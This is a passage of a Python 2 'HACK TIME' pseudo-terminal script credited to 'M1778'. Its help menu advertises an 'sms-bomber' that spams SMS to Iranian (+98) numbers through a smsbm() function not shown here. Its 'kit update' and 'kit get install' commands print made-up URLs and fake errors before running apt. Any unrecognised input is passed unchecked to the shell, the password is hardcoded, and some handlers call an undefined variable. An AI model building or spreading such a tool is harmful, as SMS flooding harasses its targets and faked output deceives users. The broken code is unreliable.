                    time.sleep(3)
            elif tera == "get-ride":
                while True:
                    print("running")
                    time.sleep(9999999999999999999999999999)
            elif tera == "get-html":
                print("this command not ready")
            elif tera == "visit":
                yotu = raw_input("url:")
                print commands.getoutput(cmd="wget {}".format(yotu))
                print("|visit|")
            elif tera == "kit":
                print("""kit-version:2.23.4
kit install [object]             install the packet
kit update                        update the kit
kit upgrade                       upgrade the kit
kit get install [package name.]
kit get ping                    get ping from linux
\033[95mkit --sert point                <import CMD>\033[0m """)
            elif "kit install " in tera :
                yty = raw_input("enter package name: ")
                print commands.getoutput(cmd="sudo apt-get install {}".format(yty))
            elif "kit install" in tera:
                yty = raw_input("enter package name: ")
                print commands.getoutput(cmd="sudo apt-get install {}".format(yty))
            elif tera == "kit update":
                print("check for update..")
                time.sleep(4)
                print("update serios         [983k]")
                time.sleep(2)
                print("https://github.com/kit/update132")
                time.sleep(2)
                print("https://github.com/kit/update1")
                time.sleep(2)
                print("https://github.com/kit/update2")
                time.sleep(2)
                print("https://github.com/kit/update3")
                time.sleep(2)
                print("https://github.com/kit/update3.5")
                time.sleep(2)
                print("https://github.com/kit/update56")
                time.sleep(2)
                print("https://github.com/kit/update12")
                time.sleep(2)
                print("https://github.com/kit/update325")
                time.sleep(2)
                print("https://github.com/kit/update32")
                time.sleep(2)
                print("https://github.com/kit/update18")
                time.sleep(2)
                print("https://github.com/kit/update901")
                time.sleep(8)
                print commands.getoutput(cmd="sudo apt update")
                print("updated 0")
            elif tera == "kit upgrade":
                print("check for upgrade..")
                time.sleep(2)
                print("please wait for upgrade")
                time.sleep(15)
                print commands.getoutput(cmd="sudo apt upgrade")
                print("upgrade complite (0)")
            elif "kit get install " in tera:
                kiki = raw_input("enter package name:")
                print("check package")
                time.sleep(4)
                print("ERROR 702")
                time.sleep(4)
                print commands.getoutput(cmd="sudo apt-get install {}".format(kiki))
                print("package installed.")
            elif tera == "kit get ping":
                popo = 1
                while True:
                    time.sleep(2)
                    print("geting..")
                    popo += 1
                    if popo == 10000:
                        print("get ping complated.")
                        ter()
            elif tera == "kit --sert point":
                time.sleep(99999999999999)
            else:
                wdk = commands.getoutput(cmd="{}".format(tera))
                if "sh:" not in wdk:
                    print wdk
                else:
                    print("E: {}:<command>notfound".format(tera))
                    print wdk
        else:
            tern.tern()
##############################################################################################################
#LOGOS OR COMMNADS FOR EVRY USE
Card = ("""
%s********************************************************************
%s*                 ADDMIN:[PARADOX_TEXTER]                          *
%s*                    Creator:[M1778]                               *
%s*                telegram:[@hack_time0020]                         *
%s*                                                                  *
%s********************************************************************%s
""" % (Red, Yellow, Blue, Green, Red, Red, Fin))
Help = """HACK TIME[Version<#2>/Creator<'M1778Cyber'>/Admin<PARADOX_TEXTER>/Format<Python2>]
--------------------------------------------------------------------------------------------------------------
|help|~[Show You More commands]
|exit|~[exit]
|platform|~[show your platform]
|clear|~[clearing your page]
<Kit>~[Kit is VIP command of terminal and use for help]
|sms-bomber|~[spam sms to target(ir<+98>)]
--------------------------------------------------------------------------------------------------------------
if 0 in output useding cmd terminal<>
But HACK TIME < $WE ARE NOT HACKER WE CAN HACK%FUCK YOU
"""
HACK_TIME_LG =("""
%s  _    _          _____ _  __%s  _______ _____ __  __ ______ 
%s | |  | |   /\   / ____| |/ /%s |__   __|_   _|  \/  |  ____|
%s | |__| |  /  \ | |    | ' / %s    | |    | | | \  / | |__   
%s |  __  | / /\ \| |    |  <  %s    | |    | | | |\/| |  __|  
%s | |  | |/ ____ \ |____| . \ %s    | |   _| |_| |  | | |____ 
%s |_|  |_/_/    \_\_____|_|\_\%s    |_|  |_____|_|  |_|______|%s                                                          
""" % (Yellow, Red, Yellow, Red, Yellow, Red, Yellow, Red, Yellow, Red, Yellow, Red,Fin))




############################################################################################################
def VIP():
    usr = raw_input("%sEnter Your User Name%s:" % (TU__, Fin))
    print HACK_TIME_LG
    while True:
        term = raw_input("%s%s%s%s%s%s$HACK%s_%sTIME%s/%sM1778%s>" % ("{",Yellow,usr,Fin,"}",Blue, Red, Blue2, Red, TU__,Fin))
        if term == "exit":
            clear()
            exit()
        #Kit
        elif term == "Kit":
            print("""kit-version:2.23.4
kit install [object]             install the packet
kit update                        update the kit
kit upgrade                       upgrade the kit
kit get install [package name.]
kit get ping                    get ping from linux""")
        elif term == "KIT":
            print("""kit-version:2.23.4
kit install [object]             install the packet
kit update                        update the kit
kit upgrade                       upgrade the kit
kit get install [package name.]
kit get ping                    get ping from linux""")
        elif term == "kit":
            print("""kit-version:2.23.4
kit install [object]             install the packet
kit update                        update the kit
kit upgrade                       upgrade the kit""")
        elif "kit install " in term:
            ktin(ter)
        elif "KIT INSTALL " in term:
            ktin(ter)
        elif "Kit Install " in term:
            ktin(ter)
        elif term == "Clear":
            clear()
        elif term == "clear":
            clear()
        elif term == "CLEAR":
            clear()
        elif term == "sms-bomber":
            smsbm()
        elif term == "SMS-BOMBER":
            smsbm()
        elif term == "sms bomber":
            smsbm()
        elif term == "SMS BOMBER":
            smsbm()
        elif term == "Exit":
            clear()
            exit()
        elif term == "EXIT":
            clear()
            exit()
        elif term == "Platform":
            print platform.platform()
        elif term == "platform":
            print platform.platform()
        elif term == "PLATFORM":
            print platform.platform()
        #Helps            ############################################################
        elif term == "commands":
            print(Help)
        elif term == "Commands":
            print(Help)
        elif term == "COMMANDS":
            print(Help)
        elif term == "help":
            print(Help)
        elif term == "Help":
            print(Help)
        elif term == "":
            pass
        elif term == " ":
            pass
        elif term == "  ":
            pass
        elif term == "help ":
            print(Help)
        elif term == "Help ":
            print(Help)
        elif term == "HELP":
            print(Help)
        elif term == "M1778Cyber":
            ter()
        #################################################################################################
        #Error NotFound
        else:
            wdk = os.system("{}".format(ter))
            if wdk==0:
                print wdk
            else:
                print("E: {}:<command>NotFound USE(Help)".format(ter))

###############################################################################################################
def NMT():
    pass






def main():
    print HACK_TIME_LG
    print("""
%s********************************************************************
%s*                 ADDMIN:[PARADOX_TEXTER]                          *
%s*                    Creator:[M1778]                               *
%s*                      telegram:[]                                 *
%s*                                                                  *
%s********************************************************************%s
""" % (Red, Yellow, Blue, Green, Red, Red, Fin))
    passwd = getpass._raw_input(Blue2 + "ENTER PASSWORD:" + Fin)
    if passwd == "1778":
        print("{}WELLCOME{}".format(Pink, Fin))
        time.sleep(4)
        Start()
        time.sleep(3)
        clear()
        VIP()
    else:
        print("%sPassword Notfound!%s" % (Red, Fin))
        print("Conecting To Normal Terminal<$>")
        Start()
        clear()
        NMT()
main()
